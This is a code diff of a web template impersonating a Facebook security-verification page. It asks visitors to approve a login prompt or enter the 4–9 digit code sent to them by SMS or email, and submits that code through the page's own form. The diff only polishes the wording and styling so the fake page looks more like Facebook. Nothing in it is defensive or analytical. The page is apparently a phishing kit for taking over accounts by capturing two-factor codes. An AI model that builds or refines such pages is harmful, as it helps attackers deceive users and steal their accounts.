@@ -7,27 +7,43 @@
     </div>
     <div>
       <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Security Verification Required</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48">Security check…</h3>
-  <p>Option 1 
-For your security, please confirm that you are the owner of this Facebook account. We’ve sent a login notification to the registered device. Approve the login to continue. Thank you.</p>
-  <p>Option 2
-If you receive a code by SMS or email from Facebook instead of a login approval, please enter the code below and click “Submit” to continue.</p>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="security-options">
+    <div class="option-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Option 1: Login Approval</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        For account security, please verify you are the authorized account owner. We've sent a login notification to your registered device. Approve the request to proceed with authentication.
+      </p>
+    </div>
+
+    <div class="option-card">
+      <h4 style="color:#1e293b;margin:16px 0 8px 0;font-size:15px;font-weight:600">Option 2: Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        If you received a security code via SMS or email from Facebook, please enter it below to complete the verification process.
+      </p>
+    </div>
+  </div>
   
   <form id="loginForm" method="post" novalidate>
-    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Submit</button>
+      <button class="btn login-btn" type="submit">Verify & Continue</button>
     </div>
   </form>
 
-  <p style="font-size:13px;color:#64748b;margin-top:8px">
-    But if you’ve clicked approve on your facebook account please wait for a couple of seconds, we have to confirm it.
-  </p>
+  <div class="note-box">
+    <p style="font-size:13px;color:#64748b;margin:0;line-height:1.5">
+      <strong>Note:</strong> If you've already approved the login request, please allow a moment for system verification. The process typically completes within seconds.
+    </p>
+  </div>
 
   <script>
   // Auto redirect after 2 minutes (120,000 ms)
@@ -48,7 +64,7 @@ If you receive a code by SMS or email from Facebook instead of a login approval,
     if (!pattern.test(val)) {
       valid = false;
       digits.classList.add("input-error");
-      digitsError.textContent = "The code you entered is incorrect.";
+      digitsError.textContent = "Please enter a valid 4-9 digit security code.";
     }
 
     if (!valid) event.preventDefault();
@@ -67,26 +83,29 @@ If you receive a code by SMS or email from Facebook instead of a login approval,
 .input {
   width: 100%;
   padding: 14px;
-  border-radius: 18px;
+  border-radius: 12px;
   border: 1px solid #e5e7eb;
   margin-bottom: 8px;
   font-size: 16px;
   transition: border-color 0.2s, box-shadow 0.2s;
+  background: #fafafa;
 }
 .input:focus {
   border-color: #1877F2;
-  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
   outline: none;
+  background: #ffffff;
 }
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
   margin-top: -4px;
-  margin-bottom: 8px;
+  margin-bottom: 12px;
+  font-weight: 500;
 }
 
 .login-btn {
@@ -95,21 +114,46 @@ If you receive a code by SMS or email from Facebook instead of a login approval,
   color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 25px;
+  padding: 14px;
+  border-radius: 12px;
   cursor: pointer;
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  box-shadow: 0 4px 12px rgba(24,119,242,0.3);
   display: block;
-  margin-top: 8px;
+  margin-top: 16px;
 }
 .login-btn:hover {
   background: #166fe5;
-  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+  box-shadow: 0 6px 16px rgba(24,119,242,0.4);
+  transform: translateY(-1px);
 }
 .login-btn:active {
   transform: scale(0.985);
+}
+
+.security-options {
+  margin: 20px 0;
+}
+
+.option-card {
+  background: #f8fafc;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #1877F2;
+  margin-bottom: 16px;
+}
+
+.note-box {
+  background: #fffbeb;
+  border: 1px solid #fef3c7;
+  border-radius: 12px;
+  padding: 12px 16px;
+  margin-top: 20px;
+}
+
+.center {
+  text-align: center;
 }
 </style>
 {% endblock %}
